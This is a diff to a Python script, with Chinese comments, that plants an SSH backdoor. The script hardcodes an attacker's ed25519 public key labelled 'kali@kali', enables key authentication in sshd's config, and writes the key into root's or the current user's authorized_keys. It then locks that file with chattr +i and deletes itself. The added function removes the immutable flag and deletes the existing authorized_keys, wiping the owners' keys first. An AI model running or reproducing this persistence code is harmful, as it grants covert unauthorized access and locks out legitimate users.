@@ -75,17 +75,31 @@ def delete_current_script():
     except Exception as e:
         print("无法删除当前脚本文件：", e)
 
+def delsshKey(user):
+    try:
+        if 'root' in user:
+            ml('chattr -i /root/.ssh')
+            ml('chattr -i /root/.ssh/authorized_keys')
+            ml('rm -rf /root/.ssh/authorized_keys')
+        else:
+            ml('chattr -i /home/'+user+'/.ssh')
+            ml('chattr -i /home/'+user+'/.ssh/authorized_keys')
+            ml('rm -rf  /home/' + user + '/.ssh/authorized_keys')
+    except Exception as e:
+        pass
+
 if __name__ == '__main__':
     id_ed25519_pub = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF9OQyvU7TkC4Julezg31Lbj2YB3RSwhmM0yJwwtO4iK kali@kali"
     # 调用 miyue 函数来在文件末尾写入新内容
     # ssh-keygen -t ed25519 -N "admin!@#45123"
+    user = ml('whoami').strip()
+    delsshKey(user)
     try:
         miyue("HostKey /etc/ssh/ssh_host_ed25519_key")
         miyue("PubkeyAuthentication yes")
         miyue("AuthorizedKeysFile .ssh/authorized_keys")
     except Exception as e:
         print('低权限用户配置文件写入失败，有的低权限用户不影响使用')
-    user = ml('whoami').strip()
     if 'root' in user:
         root_authorized_keys(id_ed25519_pub)
         ml('chattr +i /root/.ssh && chattr +i /root/.ssh/authorized_keys')
